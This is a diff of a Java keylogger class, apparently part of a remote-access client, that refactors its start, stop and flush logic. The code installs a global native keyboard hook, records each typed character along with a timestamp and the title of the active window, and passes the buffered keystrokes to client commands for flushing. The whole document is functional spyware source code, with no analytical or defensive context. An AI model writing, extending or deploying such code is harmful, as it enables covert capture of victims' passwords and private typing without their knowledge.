@@ -37,30 +37,48 @@ public enum Keylogger {
 	;
 	private static final Logger log = LoggerFactory.getLogger(Keylogger.class);
 
-	private static Thread monitor;
-
-	// dont forget to notify this buffer when using event method
+	/**
+	 * Keybuffer that stores results from native hook
+	 */
 	public static ArrayList<EV_KEvent> buffer = new ArrayList<EV_KEvent>();
 
-	public static FLUSH_METHOD method;
+	/**
+	 * Thread that monitors the keybuffer for changes
+	 */
+	private static Thread monitor;
 
+	/**
+	 * Native keyboard interface
+	 */
+	private static NKL nkl;
+
+	/**
+	 * Launches the keylogger with given options
+	 * 
+	 * @param m
+	 * @param value
+	 * @throws HeadlessException
+	 * @throws NativeHookException
+	 */
 	public static void start(FLUSH_METHOD m, int value) throws HeadlessException, NativeHookException {
 		if (GraphicsEnvironment.isHeadless()) {
 			throw new HeadlessException();
 		}
 
-		method = m;
-
 		stop();
 		log.info("Starting keylogger");
+
 		monitor = new Thread(new Runnable() {
 			public void run() {
 				try {
-					switch (method) {
+					switch (m) {
 					case EVENT:
 						while (!Thread.currentThread().isInterrupted()) {
 							// wait for an event
-							buffer.wait();
+							synchronized (buffer) {
+								buffer.wait();
+							}
+
 							if (buffer.size() > value) {
 								ClientCommands.flushKeybuffer();
 							}
@@ -80,16 +98,17 @@ public enum Keylogger {
 					}
 
 				} catch (InterruptedException e) {
-					log.info("Exited monitoring thread");
-				} // TODO test for IllegalStateException
+					return;
+				}
 
 			}
 		});
 		monitor.start();
 
+		nkl = new NKL(m);
 		try {
 			GlobalScreen.registerNativeHook();
-			GlobalScreen.addNativeKeyListener(new NKL());
+			GlobalScreen.addNativeKeyListener(nkl);
 		} catch (NativeHookException e) {
 			stop();
 			throw e;
@@ -97,6 +116,9 @@ public enum Keylogger {
 
 	}
 
+	/**
+	 * Stops keylogger if running
+	 */
 	public static void stop() {
 		if (monitor != null) {
 			log.info("Stopping keylogger");
@@ -106,20 +128,33 @@ public enum Keylogger {
 		}
 
 		try {
+			if (nkl != null) {
+				GlobalScreen.removeNativeKeyListener(nkl);
+			}
 			GlobalScreen.unregisterNativeHook();
 		} catch (NativeHookException e) {
-
 		}
 
 	}
 
+	/**
+	 * Query the state of the keylogger
+	 * 
+	 * @return true if keylogger is running
+	 */
 	public static boolean isLogging() {
-		return monitor == null ? false : monitor.isAlive();
+		return monitor == null ? false : (monitor.isAlive() && GlobalScreen.isNativeHookRegistered());
 	}
 
 }
 
 class NKL implements NativeKeyListener {
+
+	private FLUSH_METHOD method;
+
+	public NKL(FLUSH_METHOD m) {
+		this.method = m;
+	}
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent e) {
@@ -136,7 +171,7 @@ class NKL implements NativeKeyListener {
 			Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(e.getWhen()).setTitle(windowTitle)
 					.setEvent((e.getModifiers() == 0 ? "" : "") + e.getKeyChar()).build());
 
-			if (Keylogger.method == FLUSH_METHOD.EVENT) {
+			if (method == FLUSH_METHOD.EVENT) {
 				// notify monitor thread
 				Keylogger.buffer.notifyAll();
 
